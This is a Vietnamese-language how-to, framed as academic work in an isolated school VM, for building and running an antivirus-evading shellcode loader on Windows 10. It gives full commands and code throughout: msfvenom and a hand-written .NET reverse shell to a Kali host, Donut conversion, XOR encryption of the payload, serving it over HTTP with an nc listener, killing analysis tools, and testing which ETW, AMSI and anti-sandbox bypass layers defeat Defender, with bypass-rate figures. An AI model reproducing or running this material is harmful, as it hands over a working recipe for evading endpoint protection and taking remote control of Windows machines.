# Hướng dẫn chạy FinalLoaderV2 — Full Evasion
> Môi trường: VM cô lập nhà trường | Nghiên cứu học thuật

---

## BƯỚC 0 — Cấu hình file trước khi compile

Mở `FinalLoaderV2.cs`, **không cần sửa IP trong code** vì URL được truyền qua tham số khi chạy.

Chỉ kiểm tra các flag — giữ nguyên mặc định:

```csharp
const bool A_ANTISANDBOX  = true;
const bool B_ETW_BYPASS   = true;
const bool C_AMSI_VEH     = true;
const bool D_DYNAMIC_API  = true;
const bool E_RW_RX        = true;
```

> Không có IP hardcode trong V2. IP Kali được truyền vào lúc chạy qua tham số dòng lệnh.

---

## BƯỚC 1 — Chuẩn bị máy ATTACKER (Kali Linux)

> **Khuyến nghị:** Dùng **Option B (Donut)** — bypass rate cao hơn ~25% so với msfvenom raw

---

### OPTION A — msfvenom (nhanh, bypass rate ~50%)

#### 1.1a Tạo shellcode
```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o shell.bin
```

#### 1.2a XOR encrypt
```bash
python3 -c "
key = b'mykey123'
data = open('shell.bin','rb').read()
enc  = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
open('payload.bin','wb').write(enc)
print('[+] Done:', len(enc), 'bytes')
"
```

---

### OPTION B — Donut (khuyến nghị, bypass rate ~75–80%)

> Donut convert .NET assembly thành shellcode — signature hoàn toàn khác msfvenom

#### 1.1b Cài Donut
```bash
# Clone và build
git clone https://github.com/TheWover/donut
cd donut
make
# Binary: ./donut
```

#### 1.2b Tạo payload .NET đơn giản
```bash
# Tạo file payload.cs — reverse shell bằng .NET thuần
cat > payload.cs << 'EOF'
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;

class P {
    static void Main(string[] args) {
        var c = new TcpClient("192.168.1.100", 4444);
        var s = c.GetStream();
        var p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.OutputDataReceived += (o, e) => { if(e.Data!=null) { var b=System.Text.Encoding.UTF8.GetBytes(e.Data+"\n"); s.Write(b,0,b.Length); } };
        p.ErrorDataReceived  += (o, e) => { if(e.Data!=null) { var b=System.Text.Encoding.UTF8.GetBytes(e.Data+"\n"); s.Write(b,0,b.Length); } };
        p.Start();
        p.BeginOutputReadLine();
        p.BeginErrorReadLine();
        var sr = new StreamReader(s);
        while(true) { string l=sr.ReadLine(); if(l==null) break; p.StandardInput.WriteLine(l); }
    }
}
EOF

# Compile payload thành .exe
mcs -out:payload.exe payload.cs
# Hoặc nếu dùng mono:
# dotnet-script payload.cs
```

#### 1.3b Convert sang shellcode bằng Donut
```bash
./donut \
  -i payload.exe \
  -o shell_donut.bin \
  -a 2 \
  -f 1
# -a 2 = x64
# -f 1 = raw shellcode output
```

#### 1.4b XOR encrypt shellcode Donut
```bash
python3 -c "
key = b'mykey123'
data = open('shell_donut.bin','rb').read()
enc  = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
open('payload.bin','wb').write(enc)
print('[+] Donut payload done:', len(enc), 'bytes')
"
```

---

### 1.5 Host file qua HTTP
```bash
python3 -m http.server 8080
```
> Mở terminal mới, giữ server chạy

### 1.6 Mở listener
```bash
nc -lvnp 4444
```
> Mở terminal mới, giữ listener chạy

---

## BƯỚC 2 — Chuẩn bị máy TARGET (Windows 10 VM)

### 2.1 Kiểm tra uptime VM (phải >= 10 phút)
```cmd
powershell -command "[math]::Round(((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime).TotalMinutes)"
```
> Nếu < 10: chờ thêm hoặc giảm `MIN_UPTIME` xuống 2 trong code

### 2.3 Kiểm tra RAM (phải >= 4GB)
```cmd
powershell -command "[math]::Round((gcim Win32_ComputerSystem).TotalPhysicalMemory/1GB, 1)"
```
> Nếu < 4: vào VMware Settings → tăng RAM lên 4GB hoặc giảm `MIN_RAM_GB` xuống 2

### 2.4 Đóng hết tool phân tích nếu đang mở
```cmd
taskkill /F /IM wireshark.exe 2>nul
taskkill /F /IM procmon.exe 2>nul
taskkill /F /IM x64dbg.exe 2>nul
```

### 2.5 Mở notepad
```cmd
notepad.exe
```

---

## BƯỚC 3 — Compile

```cmd
cd C:\Users\%USERNAME%\Desktop
copy FinalLoaderV2.cs .

"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:loader.exe FinalLoaderV2.cs
```

Nếu lỗi Microsoft.Win32.Registry:
```cmd
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" ^
  /reference:"C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.8\Microsoft.Win32.Registry.dll" ^
  /out:loader.exe FinalLoaderV2.cs
```

Kiểm tra compile thành công:
```cmd
dir loader.exe
```

---

## BƯỚC 4 — Chạy loader

**Quan trọng: Mở `cmd.exe` mới (không double-click)**
```cmd
cmd.exe
```

Chạy loader:
```cmd
loader.exe mykey123 http://192.168.1.100:8080/payload.bin mykey123
```

---

## BƯỚC 5 — Kiểm tra kết quả

**Trên Kali — xem HTTP server nhận request:**
```
192.168.1.xxx - - [xx/xx] "GET /payload.bin HTTP/1.1" 200 -
```

**Trên Kali — xem shell về:**
```
connect to [192.168.1.100] from (UNKNOWN) [192.168.1.xxx] xxxx
Microsoft Windows [Version 10.0.xxxxx]
C:\Users\...>
```

---

## BƯỚC 6 — Debug nếu không có shell

### Loader thoát ngay lập tức → Anti-sandbox fail
```cmd
powershell -command "
Write-Host 'RAM (GB):' ([math]::Round((gcim Win32_ComputerSystem).TotalPhysicalMemory/1GB,1))
Write-Host 'Uptime (min):' ([math]::Round(((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime).TotalMinutes))
"
```
> RAM phải >= 4, Uptime phải >= 10

### Defender detect → xem log
```powershell
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" `
  | Where-Object { $_.Id -eq 1116 } `
  | Select-Object -First 5 `
  | Format-List TimeCreated, Message
```

### Shellcode bị detect → đổi payload
```bash
# Dùng Donut thay msfvenom (nếu có)
# Hoặc encode thêm 1 lớp XOR nữa
python3 -c "
import os
key2 = b'layer2'
data = open('payload.bin','rb').read()
enc2 = bytes(data[i] ^ key2[i % len(key2)] for i in range(len(data)))
open('payload2.bin','wb').write(enc2)
"
# Đổi key trong code: XorBytes(XorBytes(enc, payloadKey), 'layer2')
```

---

## BƯỚC 7 — Test ablation (sau khi chạy được)

Sau khi shell về thành công, test xem từng layer bypass Defender như thế nào:

```
1. Tắt D_DYNAMIC_API = false → compile → scan tĩnh → chạy → Defender detect không?
2. Tắt E_RW_RX = false       → compile → scan tĩnh → chạy
3. Tắt B_ETW_BYPASS = false  → compile → scan tĩnh → chạy
4. Tắt C_AMSI_VEH = false    → compile → scan tĩnh → chạy
```

Scan tĩnh (không cần chạy):
```cmd
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File loader.exe
```

---

## Tóm tắt flow

```
[Option A] Kali: msfvenom → XOR encrypt → http.server + nc listener
[Option B] Kali: payload.cs → mcs compile → donut → XOR encrypt → http.server + nc listener

Windows: hosts file → compile loader → cmd.exe → loader.exe
Kết quả: shell về trên Kali
```

## So sánh Option A vs B

| | Option A (msfvenom) | Option B (Donut) |
|---|---|---|
| Thời gian setup | 2 phút | 10 phút |
| Bypass rate | ~50% | ~75–80% |
| Lý do | Defender nhận pattern msfvenom | Donut shellcode không có signature |
| Khuyến nghị | Test nhanh | Bypass thực sự |
